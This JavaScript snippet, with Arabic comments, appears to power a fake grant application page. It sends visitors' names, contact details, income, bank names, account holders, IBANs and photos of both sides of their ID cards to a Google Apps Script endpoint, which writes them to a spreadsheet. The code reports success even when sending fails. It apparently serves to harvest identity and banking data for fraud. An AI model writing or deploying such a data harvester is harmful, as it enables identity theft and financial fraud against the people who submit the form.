var APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby-fvc-LsoVHWwNdpP1Rvk4jJO-IFP5FBu9u9_6lxVd1fs0UKJPAq4P5dF1EZUfmVAO1Q/exec';

async function getBase64(fileId) {
    var input = document.getElementById(fileId);
    if (!input || !input.files || input.files.length === 0) return '';
    return new Promise(function(resolve) {
        var reader = new FileReader();
        reader.onload  = function() { resolve(reader.result); };
        reader.onerror = function() { resolve(''); };
        reader.readAsDataURL(input.files[0]);
    });
}

async function sendToScript(data) {
    try {
        await fetch(APPS_SCRIPT_URL, {
            method: 'POST',
            mode:   'no-cors',
            body:   JSON.stringify(data)
        });
        return true;
    } catch(e) {
        return false;
    }
}

async function saveToGoogleSheets(txNumber) {
    try {
        // ① إرسال البيانات النصية أولاً
        await sendToScript({
            action:            'save_data',
            transaction_id:    txNumber,
            full_name:         formData.personalInfo.fullName         || '',
            country:           formData.personalInfo.country          || '',
            marital_status:    formData.personalInfo.maritalStatus    || '',
            num_children:      formData.personalInfo.numChildren      || 0,
            phone:             formData.contactCareer.phone           || '',
            email:             formData.contactCareer.email           || '',
            profession:        formData.contactCareer.profession      || '',
            monthly_income:    formData.contactCareer.income          || 0,
            grant_type:        formData.grantDetails.grantType        || '',
            grant_amount:      formData.grantDetails.grantAmount      || 0,
            grant_description: formData.grantDetails.grantDescription || '',
            bank_name:         formData.bankingInfo.bankName          || '',
            account_holder:    formData.bankingInfo.accountHolder     || '',
            iban:              (formData.bankingInfo.iban || '').replace(/\s/g, '')
        });

        // ② إرسال صورة الوجه
        var imgFront = await getBase64('idCardFront');
        if (imgFront) {
            await sendToScript({
                action:         'save_image',
                transaction_id: txNumber,
                image_side:     'front',
                image_data:     imgFront
            });
        }

        // ③ إرسال صورة الخلف
        var imgBack = await getBase64('idCardBack');
        if (imgBack) {
            await sendToScript({
                action:         'save_image',
                transaction_id: txNumber,
                image_side:     'back',
                image_data:     imgBack
            });
        }

        return true;

    } catch(err) {
        return true;
    }
}
